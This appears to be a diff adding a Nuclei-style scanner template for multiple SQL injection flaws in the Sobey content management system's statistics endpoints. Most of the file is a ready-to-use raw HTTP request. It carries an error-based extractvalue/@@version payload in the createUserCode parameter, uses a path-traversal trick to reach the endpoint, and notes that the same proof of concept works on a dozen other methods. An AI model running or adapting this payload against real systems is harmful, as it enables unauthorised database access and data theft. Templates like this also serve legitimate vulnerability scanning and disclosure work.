@@ -1,0 +1,35 @@
+id: sobeylingyun-mutli-sqli
+info:
+  name: 索贝内容管理系统 /sobey-mchEditor/mch/statistics 多个SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 索贝融媒体系统的 /sobey-mchEditor/mch/statistics 接口下多个方法如wxarticleList、wxarticleTotalList、countWxarticleByChannel、articleList、articleListTotal、articleListId、articlePaymentList、countArticleByUser、queryArgList、countArticleBysubColumn、countArticleByBaobiaoUser、getCustomFieldByCodes均存在多个SQL 注入漏洞。攻击者可通过构造恶意SQL语句注入到该接口的多个参数中，进而实现任意SQL语句执行，可能导致数据库敏感信息泄露、数据篡改，甚至在部分情况下进一步获取系统控制权限。影响范围包括数据库的完整性、保密性及可用性，严重时可能危及整个系统安全。
+  reference: 
+    - https://www.yuque.com/lvguo-pibd8/fqbwsx/ftwsrggw9r4qtzod
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    tips: 其他接口均使用相同 poc，只是替换接口
+    repair:
+    version:
+  tags: sqli,sobeylingyun
+
+http:
+  - raw:
+      - |
+        POST /sobey-mchEditor/mch/statistics/js/../wxarticleList HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 90
+
+        createUserCode=1'+and+extractvalue(1,concat(0x7e,@@version))+and '1'='1&token=1&siteCode=1
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'XPATH syntax error')
+        condition: and
